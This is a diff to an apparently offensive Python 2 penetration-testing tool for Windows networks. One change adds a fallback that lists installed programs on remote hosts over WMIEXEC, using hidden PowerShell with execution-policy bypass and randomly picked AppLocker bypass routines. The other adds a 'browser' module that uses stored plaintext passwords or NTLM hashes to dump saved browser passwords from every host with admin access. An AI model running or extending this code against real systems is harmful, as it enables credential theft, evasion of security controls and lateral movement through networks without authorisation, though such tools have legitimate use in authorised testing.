@@ -3288,6 +3288,7 @@ def listRemoteShare(targetIP,domain, username, password):
 
 def getInstalledPrograms(targetIP,domain,username,password,passwordHash):
     osArch64=True
+    results=''
     powershellPath=getPowershellPath(targetIP,domain,username,password,passwordHash)
     powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
     command=" \"Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName\""
@@ -3312,6 +3313,30 @@ def getInstalledPrograms(targetIP,domain,username,password,passwordHash):
         if debugMode==True:   
             print command
             print results
+    if "Cannot find path" in str(results):
+        command=" \"Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName\""
+        if applockerBypass==True:
+            newCmd=''
+            randomCount=(randint(1, 3))
+            if randomCount==1:
+                newCmd=appLockerBypass2(targetIP, domain, username, password, passwordHash,command)
+            if randomCount==2:
+                newCmd=appLockerBypass3(targetIP, domain, username, password, passwordHash,command)
+            if randomCount==3:
+                newCmd=appLockerBypass4(targetIP, domain, username, password, passwordHash,command)
+            if debugMode==True:                        
+                print newCmd
+            results,status=runWMIEXEC(targetIP,domain,username,password,passwordHash,newCmd)
+            if debugMode==True:   
+                print command
+                print results
+        else:
+            command=powershellPath+" "+powershellArgs+" -command \"Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName\""
+            results,status=runWMIEXEC(targetIP,domain,username,password,passwordHash,command)
+            if debugMode==True:   
+                print command
+                print results
+
     #results=runRemoteCMD(targetIP,domain,username,password,passwordHash,command)
     tmpResultList1=[]
     if "FullyQualifiedErrorId" not in str(results):
@@ -5939,6 +5964,28 @@ if args.module=="passwords":
         print tabulate(tmpResultList,tablefmt="simple")
     else:
         print "No results found"
+
+if args.module=="browser":
+    print (setColor("\nDumping Browser Passwords", bold, color="green"))
+    tmpResultList=[]
+    for x in accessAdmHostList:
+        tmpip=x[0]
+        tmpdomain=x[1]
+        tmpusername=x[2]
+        if len(x[3])==65 and x[3].count(":")==1:
+            tmppasswordHash=x[3]
+            tmppassword=None
+        else:
+            tmppassword=x[3]
+            tmppasswordHash=None
+        results=dumpBrowser(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
+        if len(results)>0:
+            for y in results:
+                if y not in tmpResultList:
+                    tmpResultList.append(y)
+    if len(tmpResultList)>0:
+        print tabulate(tmpResultList,tablefmt="simple")
+    os._exit(1)
 
 if args.module=="apps":
     print (setColor("\nList of Installed Programs", bold, color="green"))
